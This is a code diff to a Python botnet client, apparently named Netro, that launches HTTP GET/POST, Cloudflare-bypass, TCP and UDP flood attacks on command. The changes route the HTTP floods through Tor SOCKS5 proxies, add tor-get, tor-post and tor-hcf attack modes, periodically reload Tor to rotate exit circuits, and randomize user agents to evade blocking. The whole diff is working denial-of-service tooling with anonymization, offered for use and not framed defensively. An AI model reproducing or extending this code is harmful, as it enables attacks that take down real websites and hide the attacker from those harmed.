@@ -2,6 +2,7 @@ from urllib.parse import urlparse
 import cloudscraper
 import threading
 import random
+import string
 import socket
 import socks
 import time
@@ -9,6 +10,10 @@ import json
 import ssl
 import sys
 import os
+
+with open("./useragents.txt", "r") as file:
+    USERAGENTS = file.read().splitlines()
+    file.close()
 
 class NetroHTTP(object):
     kill = False
@@ -40,10 +45,6 @@ class NetroHTTP(object):
             port = parsed_url.port
         
         self.port = port
-
-        with open("useragents.txt", "r") as file:
-            self.useragents = [x for x in file.read().splitlines() if x.strip()]
-            file.close()
     
         if self.tor_proxies:
             if sys.platform in ["linux", "linux2"]:
@@ -55,7 +56,10 @@ class NetroHTTP(object):
                 break
 
             os.system("service tor reload")
-            time.sleep(15)
+            time.sleep(120)
+    
+    def randstr(self, length: int):
+        return "".join(random.choices(string.ascii_letters + string.digits, k=length))
         
     def create_attack_instance(self):
         self.active_threads += 1
@@ -78,6 +82,7 @@ class NetroHTTP(object):
 
             while time.time() < self.timeout and not self.kill:
                 path_request = f"{path}{f'?{parsed_url.query}' if parsed_url.query else ''}{f'#{parsed_url.fragment}' if parsed_url.fragment else ''}"
+
                 headers = {
                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                     "Accept-Encoding": "gzip, deflate, br, zstd",
@@ -94,7 +99,7 @@ class NetroHTTP(object):
                     "Sec-Fetch-Site": "none",
                     "Sec-Fetch-User": "?1",
                     "Upgrade-Insecure-Requests": "1",
-                    "User-Agent": random.choice(self.useragents)
+                    "User-Agent": random.choice(USERAGENTS)
                 }
                 request_data = f"GET {path_request} HTTP/1.1\r\n"
 
@@ -117,8 +122,9 @@ class NetroHTTPPost(object):
     kill = False
     active_threads = 0
 
-    def __init__(self, url: str, timeout: float):
+    def __init__(self, url: str, timeout: float, tor_proxies: bool = False):
         self.url = url
+        self.tor_proxies = tor_proxies
         parsed_url = urlparse(url)
 
         if not parsed_url.scheme in ["http", "https"]:
@@ -128,7 +134,8 @@ class NetroHTTPPost(object):
             raise Exception("Invalid HTTP attack timeout value.")
         
         self.timeout = timeout
-        self.host_ip = socket.gethostbyname(parsed_url.hostname)
+        if not tor_proxies:
+            self.host_ip = socket.gethostbyname(parsed_url.hostname)
 
         if not parsed_url.port:
             if parsed_url.scheme == "https":
@@ -139,19 +146,30 @@ class NetroHTTPPost(object):
             port = parsed_url.port
         
         self.port = port
-
-        with open("useragents.txt", "r") as file:
-            self.useragents = [x for x in file.read().splitlines() if x.strip()]
-            file.close()
         
+        if self.tor_proxies:
+            threading.Thread(target=self.tor_renewer, daemon=True).start()
+    
+    def tor_renewer(self):
+        while True:
+            if time.time() >= self.timeout or self.kill:
+                break
+
+            os.system("service tor reload")
+            time.sleep(120)
+
     def create_attack_instance(self):
         self.active_threads += 1
 
         try:
             parsed_url = urlparse(self.url)
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            if self.tor_proxies:
+                sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.set_proxy(proxy_type=socks.SOCKS5, addr="127.0.0.1", port=9050)
+            else:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(10)
-            sock.connect((self.host_ip, self.port))
+            sock.connect((self.host_ip if not self.tor_proxies else parsed_url.hostname, self.port))
 
             if parsed_url.scheme == "https":
                 ctx = ssl._create_unverified_context()
@@ -179,7 +197,7 @@ class NetroHTTPPost(object):
                 "Sec-Fetch-Site": "none",
                 "Sec-Fetch-User": "?1",
                 "Upgrade-Insecure-Requests": "1",
-                "User-Agent": random.choice(self.useragents)
+                "User-Agent": random.choice(USERAGENTS)
             }
             request_data = f"GET {path_request} HTTP/1.1\r\n"
 
@@ -209,15 +227,16 @@ class NetroHCF(object):
     kill = False
     active_threads = 0
 
-    def __init__(self, target: str):
+    def __init__(self, target: str, tor_proxies: bool = False):
         self.target = target
+        self.tor_proxies = tor_proxies
         self.scraper = cloudscraper.create_scraper()
     
     def create_attack_instance(self):
         self.active_threads += 1
 
         try:
-            self.scraper.get(self.target)
+            x = self.scraper.get(self.target, proxies={"http": "socks5://127.0.0.1:9050", "https": "socks5://127.0.0.1:9050"} if self.tor_proxies else None)
             time.sleep(1)
         except Exception:
             return
@@ -306,10 +325,14 @@ class NetroAttackManager(object):
                 netro_attack = NetroHTTP(url=target, timeout=timeout)
             case "http-post":
                 netro_attack = NetroHTTPPost(url=target, timeout=timeout)
-            case "http-tor":
+            case "tor-get":
                 netro_attack = NetroHTTP(url=target, timeout=timeout, tor_proxies=True)
+            case "tor-post":
+                netro_attack = NetroHTTPPost(url=target, timeout=timeout, tor_proxies=True)
             case "hcf":
                 netro_attack = NetroHCF(target=target)
+            case "tor-hcf":
+                netro_attack = NetroHCF(target=target, tor_proxies=True)
             case "tcp":
                 netro_attack = NetroTCP(target=target, timeout=timeout)
             case "udp":
@@ -463,7 +486,7 @@ class NetroBot(object):
             file.write(script_content)
             file.close()
 
-        os.execv(sys.executable, ["python3" if sys.platform == "linux" else "python"] + sys.argv + ["--restart"])
+        os.execv(sys.executable, ["python3" if sys.platform == "linux" else "python"] + sys.argv)
 
     def on_launch(self, attack_payload: dict):
         attack_id = attack_payload["id"]
